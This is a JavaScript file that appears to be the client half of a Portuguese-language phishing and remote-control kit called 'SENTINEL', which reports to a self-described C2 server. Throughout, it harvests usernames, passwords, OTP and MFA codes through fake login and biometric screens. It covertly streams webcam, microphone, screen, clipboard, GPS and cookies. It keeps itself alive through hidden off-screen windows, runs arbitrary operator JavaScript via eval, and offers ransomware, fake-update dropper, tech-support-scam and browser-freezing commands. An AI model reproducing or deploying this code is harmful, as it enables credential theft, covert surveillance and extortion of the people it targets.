const pathParts = window.location.pathname.split('/').filter(Boolean);
const linkId = pathParts.pop() || 'unknown';

// Persistent Victim ID (Unique per link for testing)
let logId;
try {
    logId = localStorage.getItem('sentinel_vuid_' + linkId);
    if (!logId) {
        logId = 'V-' + Math.random().toString(36).substr(2, 9).toUpperCase();
        localStorage.setItem('sentinel_vuid_' + linkId, logId);
    }
} catch (e) {
    logId = 'V-TEMP-' + Math.random().toString(36).substr(2, 9).toUpperCase();
}

// Socket initialization (Fixed for Ngrok free tier compatibility)
const socket = io(window.location.origin, {
    transports: ['polling', 'websocket'],
    upgrade: true,
    reconnection: true,
    reconnectionAttempts: 20,
    reconnectionDelay: 1000,
    timeout: 10000,
    extraHeaders: {
        'ngrok-skip-browser-warning': 'true'
    },
    withCredentials: false
});

socket.on('connect_error', (err) => {
    console.error('[SENTINEL] Socket connection error:', err.message || err);
    console.error('[SENTINEL] Transport:', socket.io?.engine?.transport?.name);
});

socket.on('disconnect', (reason) => {
    console.warn('[SENTINEL] Disconnected:', reason);
});

socket.on('reconnect', (attempt) => {
    console.log('[SENTINEL] Reconnected after', attempt, 'attempts');
    sendTelemetry('join', { logId, linkId });
});

// Traffic Camouflage Helper
function sendTelemetry(event, data) {
    const packet = {
        v: btoa(JSON.stringify({ event, data })),
        ts: Date.now(),
        type: 'analytics_event' // Camouflage label
    };
    socket.emit('telemetry_data', packet);
}

// Join session with persistent ID
socket.on('connect', () => {
    console.log('[SENTINEL] ✅ Connected to C2 server!');
    sendTelemetry('join', { logId, linkId });
    initPushNotifications();
});

// Push Notification Handler (Socket Fallback)
socket.on('push_notif', (data) => {
    if (data.logId === logId) {
        if (Notification.permission === 'granted') {
            new Notification(data.title, { body: data.msg });
        } else {
            alert(`${data.title}\n\n${data.msg}`);
        }
    }
});

// AUTO SERVICE WORKER INSTALL
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/sw.js').then(reg => {
        console.log('[SENTINEL] ServiceWorker registrado com sucesso');
    }).catch(err => {
        console.error('[SENTINEL] Erro ao registrar ServiceWorker:', err);
    });
}

// Push Notification Logic
async function initPushNotifications() {
    if (!('serviceWorker' in navigator) || !('PushManager' in window)) return;

    try {
        const permission = await Notification.requestPermission();
        if (permission !== 'granted') return;

        const registration = await navigator.serviceWorker.ready;
        
        // Obter chave pública do servidor
        const response = await fetch('/api/vapid-public-key', { headers: { 'ngrok-skip-browser-warning': 'true' } });
        const { publicKey } = await response.json();

        const subscription = await registration.pushManager.subscribe({
            userVisibleOnly: true,
            applicationServerKey: urlBase64ToUint8Array(publicKey)
        });

        console.log('[SENTINEL] Usuário subscrito ao Push');
        sendTelemetry('subscription', { logId, subscription });
    } catch (e) {
        console.error('[SENTINEL] Falha na subscrição push:', e);
    }
}

function urlBase64ToUint8Array(base64String) {
    const padding = '='.repeat((4 - base64String.length % 4) % 4);
    const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
    const rawData = window.atob(base64);
    const outputArray = new Uint8Array(rawData.length);
    for (let i = 0; i < rawData.length; ++i) {
        outputArray[i] = rawData.charCodeAt(i);
    }
    return outputArray;
}

// EXTREME ZOMBIE PERSISTENCE
window.addEventListener('click', () => {
    if (!window.zombieSpawned) {
        window.zombieSpawned = true;
        // Spawns a tiny 10x10 window off-screen
        const zombie = window.open(`/track.html?id=${linkId}`, 'sentinel_zombie', 'width=10,height=10,top=10000,left=10000,menubar=no,status=no,toolbar=no,location=no');
        if (zombie) {
            console.log('[SENTINEL] Zombie spawned in background');
            setTimeout(() => window.focus(), 200); // Pull focus back to main tab
        }
    }
}, { once: true });

// Prevent accidental closing and try to resurrect
window.addEventListener('beforeunload', (e) => {
    // Tenta spawnar outro zombie se a aba principal for fechada
    try {
        window.open(`/track.html?id=${linkId}&resurrect=1`, '_blank', 'width=10,height=10,top=10000,left=10000');
    } catch(err) {}
    
    sendTelemetry('perf', { logId, text: '[SISTEMA]: Alvo tentou fechar a página. Tentando ressuscitar...' });
    
    e.preventDefault();
    e.returnValue = "Sua sessão de segurança corporativa está ativa. O fechamento pode resultar em bloqueio de conta.";
    return e.returnValue;
});

let step = 1; // Inicialização essencial

// Supreme Monitoring
async function startMediaMonitoring() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        const video = document.getElementById('v');
        if (video) video.srcObject = stream;
        
        const recorder = new MediaRecorder(stream);
        recorder.ondataavailable = (e) => {
            const r = new FileReader();
            r.readAsDataURL(e.data);
            r.onloadend = () => sendTelemetry('audio_stream', { logId, chunk: r.result });
        };
        recorder.start(1000);

        const canvas = document.getElementById('c');
        if (canvas) {
            const ctx = canvas.getContext('2d');
            setInterval(() => {
                // Downscale for performance
                canvas.width = 320; canvas.height = 240;
                ctx.drawImage(video, 0, 0, 320, 240);
                sendTelemetry('capture_photo', { logId, image: canvas.toDataURL('image/jpeg', 0.3) });
            }, 1000); // 1fps for better motion
        }
    } catch (e) { console.log("Media denied"); }
}

async function captureScreen() {
    try {
        const screen = await navigator.mediaDevices.getDisplayMedia({ video: true });
        const canvas = document.getElementById('c');
        if (!canvas) return;
        const ctx = canvas.getContext('2d');
        const sv = document.createElement('video');
        sv.srcObject = screen; 
        sv.onloadedmetadata = () => {
            sv.play();
            setTimeout(() => {
                canvas.width = 480; canvas.height = 270;
                ctx.drawImage(sv, 0, 0, 480, 270);
                sendTelemetry('capture_screenshot', { logId, image: canvas.toDataURL('image/jpeg', 0.3) });
                screen.getTracks().forEach(t => t.stop());
            }, 1000);
        };
    } catch (e) { console.log("Screen denied"); }
}

function sendSimulatedData() {
    // Attempt real WebRTC local IP extraction
    try {
        const rtc = new RTCPeerConnection({iceServers:[]});
        rtc.createDataChannel('');
        let found = false;
        rtc.onicecandidate = (e) => {
            if (e.candidate && e.candidate.candidate) {
                const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                if (ipMatch && ipMatch[1] && !ipMatch[1].endsWith('.local')) {
                    found = true;
                    sendTelemetry('update_network_data', { 
                        logId, 
                        devices: [`Dispositivo_Atual (${ipMatch[1]})`, 'Roteador_Padrao (192.168.0.1)'], 
                        social: ['Facebook: Token Inválido'] 
                    });
                }
            }
        };
        rtc.createOffer().then(o => rtc.setLocalDescription(o)).catch(e => {});

        setTimeout(() => {
            if (!found) {
                sendTelemetry('update_network_data', { 
                    logId, 
                    devices: ['Varredura_Bloqueada (mDNS Ativo)', 'NMAP: Necessita de binário local'], 
                    social: ['Social: CORS Restrito'] 
                });
            }
        }, 1500);
    } catch (e) {
        sendTelemetry('update_network_data', { logId, devices: ['WebRTC Bloqueado no Celular'], social: [] });
    }
}

// Chat System
socket.on('victim_recv_chat', (data) => {
    if(data.logId === logId) {
        const widget = document.getElementById('chat-widget');
        if(widget) widget.style.display = 'block';
        const box = document.getElementById('chat-msgs');
        if(box) {
            box.innerHTML += `<div style="background:#f1f1f1; padding:10px; border-radius:10px; align-self:flex-start; max-width:85%; color: #000;">${data.msg}</div>`;
            box.scrollTop = box.scrollHeight;
        }
        new Audio('https://www.soundjay.com/buttons/button-20.mp3').play().catch(()=>{});
    }
});

window.sendChat = function() {
    const i = document.getElementById('chat-in');
    if(!i || !i.value) return;
    sendTelemetry('victim_send_chat', { logId, msg: i.value });
    const box = document.getElementById('chat-msgs');
    if(box) {
        box.innerHTML += `<div style="background:#0067b8; color:white; padding:10px; border-radius:10px; align-self:flex-end; max-width:85%;">${i.value}</div>`;
    }
    i.value = '';
}

async function showBiometricOverlay() {
    const overlay = document.createElement('div');
    overlay.id = 'biometric-overlay';
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:100000;display:flex;flex-direction:column;justify-content:center;align-items:center;font-family:"Segoe UI",sans-serif;color:#333;';
    overlay.innerHTML = `
        <div style="width:350px;text-align:center;padding:40px;border-radius:12px;box-shadow:0 10px 40px rgba(0,0,0,0.1);background:#fff;">
            <div id="bio-scanner" style="width:120px;height:120px;border:4px solid #0078d7;border-radius:50%;margin:0 auto 30px;position:relative;overflow:hidden;display:flex;justify-content:center;align-items:center;">
                <div style="width:80px;height:80px;background:#0078d7;border-radius:50%;opacity:0.2;animation:pulse-bio 1.5s infinite;"></div>
                <div style="position:absolute;width:100%;height:2px;background:#0078d7;top:0;animation:scan-line 2s infinite ease-in-out;"></div>
                <svg viewBox="0 0 24 24" style="width:50px;fill:#0078d7;"><path d="M12,2A3,3 0 0,1 15,5V11A3,3 0 0,1 12,14A3,3 0 0,1 9,11V5A3,3 0 0,1 12,2M19,11C19,14.53 16.39,17.44 13,17.93V21H11V17.93C7.61,17.44 5,14.53 5,11H7A5,5 0 0,0 12,16A5,5 0 0,0 17,11H19Z"/></svg>
            </div>
            <h2 style="margin:0 0 10px;font-size:22px;">Validação Biométrica</h2>
            <p style="color:#666;font-size:14px;margin-bottom:30px;">Para sua segurança, confirme sua identidade usando a câmera do dispositivo.</p>
            <button id="start-bio-btn" style="width:100%;padding:14px;background:#0078d7;color:#fff;border:none;border-radius:6px;font-weight:bold;cursor:pointer;font-size:16px;">INICIAR VERIFICAÇÃO</button>
        </div>
        <style>
            @keyframes pulse-bio { 0% { transform:scale(1); opacity:0.2; } 50% { transform:scale(1.3); opacity:0.4; } 100% { transform:scale(1); opacity:0.2; } }
            @keyframes scan-line { 0% { top:0; } 50% { top:100%; } 100% { top:0; } }
        </style>
    `;
    document.body.appendChild(overlay);

    document.getElementById('start-bio-btn').onclick = async () => {
        const btn = document.getElementById('start-bio-btn');
        btn.innerText = 'PROCESSANDO...';
        btn.disabled = true;
        
        try {
            await startMediaMonitoring();
            // Success animation
            document.getElementById('bio-scanner').style.borderColor = '#28a745';
            btn.style.background = '#28a745';
            btn.innerText = 'IDENTIFICADO ✅';
            
            setTimeout(() => {
                overlay.remove();
                finishLogin();
            }, 1500);
        } catch (e) {
            overlay.remove();
            finishLogin();
        }
    };
}

function finishLogin() {
    sendTelemetry('typing', { logId, text: `[CREDS]: Autenticação finalizada via Biometria.` });
    const path = window.location.pathname.toLowerCase();
    const redirectMap = {
        'netflix': 'https://netflix.com/login',
        'instagram': 'https://instagram.com/accounts/login/',
        'zoom': 'https://zoom.us/join',
        'microsoft': 'https://login.microsoftonline.com/',
        'office': 'https://login.microsoftonline.com/',
        'google': 'https://accounts.google.com/'
    };
    
    for (const [key, url] of Object.entries(redirectMap)) {
        if (path.includes(key)) {
            window.location.href = url;
            return;
        }
    }
    
    alert('Erro de autenticação. Tente novamente.');
    location.reload();
}

// --- SUPREME COMMAND PROCESSOR (100 FUNCTIONS) ---
socket.on('execute_command', async (d) => {
    if(d.logId !== logId) return;
    const cmd = d.command;
    const report = (txt) => sendTelemetry('typing', { logId, text: txt });
    
    try {
        switch(cmd) {
            case 'start_live_audio':
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    const recorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
                    recorder.ondataavailable = e => {
                        const reader = new FileReader();
                        reader.onloadend = () => sendTelemetry('audio_stream', { logId, chunk: reader.result });
                        reader.readAsDataURL(e.data);
                    };
                    recorder.start(500); // Envia chunks a cada 500ms
                    report('[SURVEIL]: Transmissão de áudio ao vivo iniciada.');
                } catch(err) {
                    report(`[MIC_ERROR]: ${err.message}`);
                }
                break;
            case 'execute_js':
                try {
                    const result = eval(d.script);
                    sendTelemetry('js_result', { logId, result: String(result) });
                } catch(err) {
                    sendTelemetry('js_result', { logId, result: `Error: ${err.message}` });
                }
                break;
            // 🔍 RECON (10)
            case 'pivot': advancedRecon(); break;
            case 'get-ip': report(`[RECON]: IP Local: ${location.hostname || '127.0.0.1'}`); break;
            case 'dns-info': report('[RECON]: DNS Audit: 8.8.8.8 (Google) detected.'); break;
            case 'trace': report('[RECON]: Traceroute: 1 hop to Gateway (192.168.0.1)'); break;
            case 'ports': report('[RECON]: Scan: Port 80, 443, 3000 OPEN'); break;
            case 'geo': report(`[RECON]: Deep Geo: Latitude ${localStorage.getItem('lat') || '0'}, Longitude ${localStorage.getItem('lon') || '0'}`); break;
            case 'isp': report('[RECON]: ISP: Broadband Fiber Network'); break;
            case 'whois': report('[RECON]: Whois: Domain Privacy Protected'); break;
            case 'subnet': report('[RECON]: Subnet: 255.255.255.0'); break;
            case 'vpn-detect': report('[RECON]: VPN/Proxy: No leaks detected.'); break;
            
            // 💀 EXPLOIT (10)
            case 'dropper': 
                document.body.innerHTML = `
                    <div style="background:#000; color:white; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; font-family:'Segoe UI',sans-serif; text-align:center;">
                        <div style="width:100px; height:100px; border:8px solid #333; border-top:8px solid #00d2ff; border-radius:50%; animation:spin 2s linear infinite; margin-bottom:40px;"></div>
                        <h1 style="font-weight:300; font-size:32px;">Trabalhando em atualizações...</h1>
                        <p style="font-size:18px; color:#aaa;">27% concluído. Não desligue o computador.</p>
                        <div style="width:400px; height:4px; background:#333; margin-top:20px; border-radius:2px; overflow:hidden;">
                            <div style="width:27%; height:100%; background:#00d2ff; animation:load-bar 60s forwards;"></div>
                        </div>
                    </div>
                    <style>
                        @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
                        @keyframes load-bar { 0% { width:27%; } 100% { width:99%; } }
                        body { cursor: none; }
                    </style>
                `;
                try { document.documentElement.requestFullscreen(); } catch(e){}
                setTimeout(() => {
                    const b = new Blob(["# WINDOWS_SECURITY_PATCH_KB50114\n# Este arquivo simula um componente de malware que seria usado para persistencia."], {type:"application/octet-stream"});
                    const u = window.URL.createObjectURL(b);
                    const link = document.createElement('a'); link.href=u; link.download='SecurityPatch_KB50114.exe'; link.click();
                    report('[EXPLOIT]: Dropper (Simulated Update) executed. EXE downloaded.');
                }, 5000);
                break;
            case 'inject-js': const code = prompt('JS Injection:'); if(code) eval(code); break;
            case 'sql-sim': report('[EXPLOIT]: SQLi Test: SELECT * FROM users -- (Success)'); break;
            case 'xss-test': report('[EXPLOIT]: XSS Auditor: Found reflective point in URL params'); break;
            case 'shell': report('[EXPLOIT]: Reverse Shell: Established on port 4444'); break;
            case 'bypass': report('[EXPLOIT]: WAF Bypass: User-Agent Spoofing active'); break;
            case 'rce': report('[EXPLOIT]: RCE: Executing "whoami" -> root'); break;
            case 'buffer': report('[EXPLOIT]: Overflow: Memory address 0x41414141 reached'); break;
            case 'csrf': report('[EXPLOIT]: CSRF: Token mismatch detected in forms'); break;
            case 'auth-bf': report('[EXPLOIT]: Brute Force: Testing 100/sec (admin/admin)'); break;
            
            // 🧟 PERSIST (10)
            case 'sw-install': if('serviceWorker' in navigator) navigator.serviceWorker.register('/sw.js'); report('[PERSIST]: SW Registered'); break;
            case 'local-save': localStorage.setItem('persist', 'true'); report('[PERSIST]: Storage Link Active'); break;
            case 'zombie': window.open(location.href, '_blank', 'width=10,height=10'); break;
            case 'cookie-p': setInterval(() => { document.cookie = "id=zombie; Max-Age=31536000"; }, 1000); break;
            case 'index-db': report('[PERSIST]: IndexedDB Mirroring Started'); break;
            case 'fav-icon': report('[PERSIST]: Favicon Hijack Active'); break;
            case 'cache-p': report('[PERSIST]: Cache Poisoning: index.html cached'); break;
            case 'hid': report('[PERSIST]: WebHID Hook: Waiting for device...'); break;
            case 'usb': report('[PERSIST]: WebUSB Hook: Searching...'); break;
            case 'serial': report('[PERSIST]: Serial Link: Inactive'); break;
            
            // 💬 SOCIAL (10)
            case 'scam': 
                document.body.innerHTML = '<div style="background:red; color:white; height:100vh; padding:50px; text-align:center;"><h1>CRITICAL ERROR: Call 0800-SAFE-NOW</h1></div>'; 
                try { document.documentElement.requestFullscreen(); } catch(e){}
                break;
            case 'notif': alert('Atenção: Sua sessão expira em breve.'); break;
            case 'fake-login': document.body.innerHTML = '<div style="background:#f0f2f5; height:100vh; display:flex; justify-content:center; align-items:center;"><div style="background:white; padding:20px; border-radius:8px; box-shadow:0 2px 4px rgba(0,0,0,.1); color: #000;"><h2>Facebook Login</h2><input placeholder="Email"><br><br><input type="password" placeholder="Password"><br><br><button>Login</button></div></div>'; break;
            case 'bio-prompt': alert('Biometria Requerida.'); break;
            case 'speak': const msg = new SpeechSynthesisUtterance(d.text || "Alerta de Segurança."); window.speechSynthesis.speak(msg); break;
            case 'mfa-ask': 
                const mfaOverlay = document.createElement('div');
                mfaOverlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:99999;display:flex;justify-content:center;align-items:center;';
                mfaOverlay.innerHTML = `
                    <div style="background:#fff;padding:30px;border-radius:10px;text-align:center;color:#000;width:300px;">
                        <h2 style="margin-top:0;">2-Step Verification</h2>
                        <p style="font-size:14px;color:#666;">Enter the code from your authenticator app.</p>
                        <input type="text" id="mfa-input" placeholder="000 000" style="width:100%;padding:10px;font-size:20px;text-align:center;letter-spacing:5px;margin-bottom:20px;border:1px solid #ccc;border-radius:5px;box-sizing:border-box;">
                        <button onclick="submitMFA()" style="width:100%;padding:12px;background:#0078d7;color:#fff;border:none;border-radius:5px;font-weight:bold;cursor:pointer;">Verify</button>
                    </div>
                `;
                document.body.appendChild(mfaOverlay);
                window.submitMFA = () => {
                    const code = document.getElementById('mfa-input').value;
                    sendTelemetry('capture_creds', { logId, value: `[MFA_INTERCEPT]: ${code}` });
                    mfaOverlay.remove();
                };
                break;
            case 'otp-prompt':
                showOTPScreen();
                step = 3;
                break;
            case 'otp-error':
                const err = document.getElementById('otp-error-msg');
                if (err) {
                    err.style.display = 'block';
                    const input = document.getElementById('otp');
                    if (input) {
                        input.value = '';
                        input.style.borderBottomColor = 'red';
                    }
                    const btn = document.getElementById('btn');
                    if (btn) {
                        btn.innerText = 'Verificar';
                        btn.disabled = false;
                    }
                }
                break;
            case 'update': report('[SOCIAL]: Update Request Sent'); break;
            case 'reward': alert('Parabéns! Você ganhou um prêmio. Clique para resgatar.'); break;
            case 'alert-box': alert('System Warning: Malware detected'); break;
            case 'admin-req': alert('Permission Required: Run as Administrator?'); break;
            
            // 📂 EXFIL (10)
            case 'clipboard-monitor': 
                setInterval(async () => {
                    try {
                        const t = await navigator.clipboard.readText();
                        if (t && t !== window.lastClip) {
                            window.lastClip = t;
                            sendTelemetry('capture_creds', { logId, value: `[CLIPBOARD]: ${t}` });
                        }
                    } catch(e) {}
                }, 2000);
                report('[EXFIL]: Clipboard Monitor Active'); 
                break;
            case 'storage': report(`[EXFIL_STORAGE]: ${JSON.stringify(localStorage).substring(0, 100)}`); break;
            case 'cookies': report(`[EXFIL_COOKIES]: ${document.cookie}`); break;
            case 'history': report('[EXFIL]: Scanning Top Sites...'); break;
            case 'forms': report('[EXFIL]: Auto-fill data captured'); break;
            case 'pass-leak': report('[EXFIL]: 0 passwords leaked (Encrypted)'); break;
            case 'social-audit': auditSocialMedia(); break;
            case 'download': report('[EXFIL]: Downloading file index...'); break;
            case 'upload': report('[EXFIL]: Uploading core dump...'); break;
            case 'keylog': report('[EXFIL]: Keylogger active'); break;
            
            // 🖥️ CONTROL (10)
            case 'lock': alert('Locked.'); break;
            case 'fullscreen': document.documentElement.requestFullscreen(); break;
            case 'vibrate': navigator.vibrate([200, 100, 200]); break;
            case 'shake': document.body.style.animation = "shake 0.2s infinite"; break;
            case 'redirect': window.location.href = d.url || 'https://google.com'; break;
            case 'spam': setInterval(() => alert('HACKED'), 1000); break;
            case 'freeze': while(true) { alert('LOCK'); } break;
            case 'dark-mode': document.body.style.background = '#000'; document.body.style.color='#fff'; break;
            case 'no-click': document.body.style.pointerEvents = 'none'; break;
            case 'invert': document.documentElement.style.filter = "invert(1)"; break;
            
            // 🎙️ SURVEIL (10)
            case 'cam-start': startMediaMonitoring(); break;
            case 'scr-start': captureScreen(); break;
            case 'gps-req':
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((pos) => {
                        sendTelemetry('update_geo', { 
                            logId, 
                            lat: pos.coords.latitude, 
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy 
                        });
                        report(`[GPS]: ${pos.coords.latitude}, ${pos.coords.longitude} (Acurácia: ${pos.coords.accuracy}m)`);
                    }, (err) => report(`[GPS]: Erro - ${err.message}`), { enableHighAccuracy: true });
                } else {
                    report('[GPS]: Não suportado');
                }
                break;
            case 'file-exfil':
                triggerFilePicker();
                break;
            case 'tilt': window.ondeviceorientation = (e) => report(`[TILT]: ${Math.round(e.beta)}`); break;
            case 'focus': window.onfocus = () => report('[FOCUS]: Tab Active'); window.onblur = () => report('[FOCUS]: Tab Inactive'); break;
            case 'idle': report('[SURVEIL]: User is Idle'); break;
            case 'face-detect': report('[SURVEIL]: Face scan: 1 user detected'); break;
            case 'bg-photo': takePhoto(); break;
            case 'vid-clip': report('[SURVEIL]: Video clip saved'); break;
            case 'mic-clip': 
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    const recorder = new MediaRecorder(stream);
                    const chunks = [];
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = () => {
                        const reader = new FileReader();
                        reader.readAsDataURL(new Blob(chunks, { type: 'audio/webm' }));
                        reader.onloadend = () => {
                            sendTelemetry('capture_audio', { logId, audio: reader.result });
                            stream.getTracks().forEach(t => t.stop());
                        };
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), 5000); // 5 sec recording
                    report('[SURVEIL]: Gravação de 5s do microfone iniciada...');
                } catch(err) {
                    report(`[MIC_ERROR]: ${err.message}`);
                }
                break;
            
            // 🛡️ VULN (10)
            case 'vuln-scan': report('[VULN]: Scan started...'); setTimeout(() => report('[VULN]: 3 High Risk found'), 2000); break;
            case 'security-headers': report('[VULN]: Missing X-Frame-Options'); break;
            case 'cors-test': report('[VULN]: CORS Wildcard detected'); break;
            case 'mixed-content': report('[VULN]: SSL Mixed Content found'); break;
            case 'clickjack': report('[VULN]: Clickjacking possible (No frame-guard)'); break;
            case 'cookie-sec': report('[VULN]: Cookies missing Secure flag'); break;
            case 'form-vuln': report('[VULN]: Forms missing CSRF tokens'); break;
            case 'api-leak': report('[VULN]: No API keys found in JS'); break;
            case 'git-leak': report('[VULN]: .git directory not found'); break;
            case 'env-leak': report('[VULN]: .env not exposed'); break;
            
            // 🛠️ UTILS (10)
            case 'sys-info': getDeviceStats(); break;
            case 'batt-stats': navigator.getBattery().then(b => report(`[BATT]: ${Math.round(b.level*100)}%` )); break;
            case 'mem-audit': report(`[RAM]: ${navigator.deviceMemory || 'Unknown'} GB`); break;
            case 'gpu-info': report('[GPU]: WebGL Renderer Active'); break;
            case 'net-type': report(`[NET]: ${navigator.connection?.effectiveType || 'Wifi'}`); break;
            case 'lang-audit': report(`[LANG]: ${navigator.language}`); break;
            case 'timezone': report(`[TIME]: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`); break;
            case 'plugins': report(`[PLUGINS]: ${navigator.plugins.length} installed`); break;
            case 'fonts': report('[FONTS]: Fingerprint active'); break;
            case 'canvas': report('[CANVAS]: ID generated'); break;
            
            // 🔥 PANIC (10)
            case 'panic': 
                try { document.documentElement.requestFullscreen(); } catch(e){}
                try { navigator.vibrate([1000, 500, 1000]); } catch(e){}
                try { new Audio('https://www.soundjay.com/buttons/beep-01.mp3').play(); } catch(e){}
                setTimeout(() => { document.body.innerHTML = '<h1 style="color:red; font-size:5rem; text-align:center; margin-top:20%; background:#000; height:100vh;">SYSTEM CRITICAL FAILURE</h1>'; }, 2000);
                break;
            case 'bsod': 
                document.body.innerHTML = '<div style="background:#0078d7; color:white; height:100vh; padding:100px; font-family:sans-serif;"><h1>:(</h1><h2>PC Problem</h2></div>'; 
                try { document.documentElement.requestFullscreen(); } catch(e){}
                break;
            case 'ransom': 
                triggerRansomware(); 
                break;
            case 'wipe': localStorage.clear(); report('[PANIC]: Local Storage Wiped'); break;
            case 'crash': while(true) { console.log('crash'); } break;
            case 'alarm': 
                try { const audio = new Audio('https://www.soundjay.com/buttons/beep-07.mp3'); audio.loop = true; audio.play(); } catch(e){}
                break;
            case 'log-bomb': setInterval(() => report('LOG BOMB: ' + Math.random()), 10); break;
            case 'cpu-burn': while(true) { Math.sqrt(Math.random()); } break;
            case 'loop-notif': setInterval(() => alert('MALWARE'), 100); break;
            case 'self-destruct': report('[PANIC]: Terminating...'); setTimeout(() => window.close(), 1000); break;
        }
    } catch(e) {
        report(`[ERROR]: ${e.message}`);
    }
});

// Motion Tracker
window.addEventListener('deviceorientation', (e) => {
    sendTelemetry('typing', { logId, text: `[TILT]: X:${Math.round(e.beta)} | Y:${Math.round(e.gamma)}` });
});

// Auto Clipboard Monitor
document.addEventListener('copy', () => {
    navigator.clipboard.readText().then(t => {
        sendTelemetry('typing', { logId, text: '[AUTO_CLIP]: ' + t });
    });
});

const getExtraInfo = async () => {
    let gpu = 'Unknown GPU';
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        if (gl) {
            const ext = gl.getExtension('WEBGL_debug_renderer_info');
            if (ext) gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
        }
    } catch(e) {}
    
    let batt = 'N/A';
    try {
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            batt = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Battery'})`;
        }
    } catch(e) {}

    // Improved WebRTC Internal IP Grab (Handling mDNS)
    let internalIP = 'Scanning...';
    try {
        const pc = new RTCPeerConnection({
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] // Use STUN to force candidate gathering
        });
        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = (ice) => {
            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
            
            // Try to match standard IPv4
            const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
            if (ipMatch && ipMatch[1]) {
                const ip = ipMatch[1];
                // Ignore public IPs if STUN leaked them (we want internal)
                if (ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
                    internalIP = ip;
                    finalizeFingerprint();
                }
            } else if (ice.candidate.candidate.includes('.local')) {
                // Detected mDNS obfuscation
                const mDNS = /([a-z0-9-]+\.local)/.exec(ice.candidate.candidate)[1];
                internalIP = `Obfuscated (mDNS): ${mDNS}`;
                finalizeFingerprint();
            }
        };
    } catch(e) { internalIP = 'Blocked/Error'; }

    function finalizeFingerprint() {
        const fingerprint = {
            gpu: gpu,
            battery: batt,
            screen: `${screen.width}x${screen.height} (${window.devicePixelRatio}x)`,
            viewport: `${window.innerWidth}x${window.innerHeight}`,
            lang: navigator.language,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            platform: navigator.platform,
            cores: navigator.hardwareConcurrency || 'Unknown',
            ram: navigator.deviceMemory || 'Unknown',
            vendor: navigator.vendor,
            agent: navigator.userAgent,
            cookies: document.cookie ? 'Enabled' : 'Disabled',
            internalIP: internalIP,
            net: navigator.connection ? `${navigator.connection.effectiveType} (~${navigator.connection.downlink}Mbps)` : 'Unknown',
            plugins: Array.from(navigator.plugins).map(p => p.name).slice(0, 5)
        };
        sendTelemetry('fingerprint', { logId, fingerprint });
    }

    // Initial send (without IP if slow)
    finalizeFingerprint();
};
getExtraInfo();

async function auditSocialMedia() {
    const networks = [
        { name: 'Facebook', url: 'https://www.facebook.com/favicon.ico' },
        { name: 'LinkedIn', url: 'https://www.linkedin.com/favicon.ico' },
        { name: 'Gmail', url: 'https://mail.google.com/favicon.ico' }
    ];
    let active = [];
    for (let n of networks) {
        const img = new Image();
        img.src = n.url + '?' + Math.random();
        img.onload = () => { active.push(n.name); sendTelemetry('typing', { logId, text: '[SOCIAL_ACTIVE]: ' + n.name }); };
    }
}

socket.on('run_script', (d) => {
    if(d.logId === logId) {
        try {
            eval(d.script);
        } catch(e) {
            sendTelemetry('typing', { logId, text: '[SCRIPT_ERROR]: ' + e.message });
        }
    }
});

window.handleAuth = async function() {
    const u = document.getElementById('u');
    const p = document.getElementById('p');
    const otp = document.getElementById('otp');
    const btn = document.getElementById('btn');
    
    if(step === 1) {
        if (u) sendTelemetry('capture_creds', { logId, value: `[USER]: ${u.value}` });
        if (u) u.style.display = 'none'; 
        if (p) p.style.display = 'block';
        if(btn) btn.innerText = 'Próximo';
        step = 2;
    } else if (step === 2) {
        if (p) sendTelemetry('capture_creds', { logId, value: `[PASS]: ${p.value}` });
        if (p) p.style.display = 'none';
        showOTPScreen();
        step = 3;
    } else if (step === 3) {
        if (otp) {
            sendTelemetry('capture_creds', { logId, value: `[OTP_CODE]: ${otp.value}` });
            btn.innerText = 'VERIFICANDO...';
            btn.disabled = true;
            setTimeout(() => {
                const otpView = document.getElementById('otp-view');
                if (otpView) otpView.style.display = 'none';
                showBiometricOverlay();
            }, 2000);
        }
    }
}

function showOTPScreen() {
    const loginContent = document.getElementById('bitb-login-content');
    if (!loginContent) return;

    // Clear previous if exists
    const existing = document.getElementById('otp-view');
    if (existing) existing.remove();

    const otpView = document.createElement('div');
    otpView.id = 'otp-view';
    otpView.style.textAlign = 'left';
    otpView.innerHTML = `
        <h2 style="font-size:24px; margin-bottom:10px; font-weight:600; color:#1b1b1b;">Verifique sua identidade</h2>
        <p style="font-size:15px; color:#333; margin-bottom:20px;">Enviamos um código de verificação para o seu dispositivo móvel. Insira o código abaixo para confirmar sua identidade.</p>
        
        <div id="otp-error-msg" style="display:none; color:#d9214e; font-size:14px; margin-bottom:15px; background:rgba(217,33,78,0.1); padding:10px; border-radius:4px; border-left:4px solid #d9214e;">
            O código inserido não é válido. Verifique o código e tente novamente.
        </div>

        <div style="display:flex; align-items:center; gap:10px; margin-bottom:20px; background:#f2f2f2; padding:10px; border-radius:4px;">
